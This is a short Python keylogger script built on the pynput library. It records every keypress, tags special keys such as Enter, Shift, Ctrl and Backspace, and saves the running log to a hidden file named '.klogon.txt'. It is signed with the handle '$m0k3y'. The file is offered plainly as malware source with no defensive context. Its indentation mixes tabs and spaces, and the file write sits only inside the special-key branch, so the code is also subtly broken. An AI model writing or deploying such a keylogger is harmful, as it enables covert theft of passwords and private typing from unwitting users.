import pynput.keyboard
    
log = ""

def process_key_press(key):
    global log
#cases
    try:
        log=log+str(key.char)
    except AttributeError:
        if key == key.space:
            log=log+" "
        elif key == key.enter:
            log=log+"~enter~"
	elif key == key.shift_r:
            log=log+"~RSh~"
    	elif key == key.shift_l:
            log=log+"~LSh~"
   	elif key == key.ctrl_l:
            log=log+"~LCtrl~"
    	elif key == key.ctrl_r:
            log=log+"~RCtrl~"
    	elif key == key.ctrl:
    	    log=log+"~Ctrl~"
    	elif key == key.shift:
    	    log=log+"~Sh~"
	elif key == key.backspace:
	    log=log+"~del~"
	else:
            log=log+str(key)+""
#writing into a hidden file name as klogon.txt  
        f=open(".klogon.txt","w")
        f.write(log)
        f.close()

keyboard_listener=pynput.keyboard.Listener(on_press=process_key_press)
    
with keyboard_listener:
    keyboard_listener.join()


#$m0k3y
